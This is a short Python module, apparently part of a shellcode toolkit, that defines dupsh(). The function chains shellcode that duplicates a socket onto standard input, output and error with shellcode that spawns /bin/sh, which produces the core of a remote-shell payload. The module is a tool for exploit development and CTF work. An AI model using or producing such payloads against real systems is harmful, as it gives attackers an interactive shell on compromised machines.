# dupsh()

import dup
import sh

def generate(sock=4, cmd='/bin/sh'):
    """Duplicates sock to stdin, stdout and stderr and spawns a shell

    Args:
        sock(int/str/reg): sock descriptor

        cmd(str): executes a cmd (default: /bin/sh)

    """
    sc = dup.generate(sock)
    sc += sh.generate(cmd)
    return sc

if __name__ == '__main__':
    print generate()
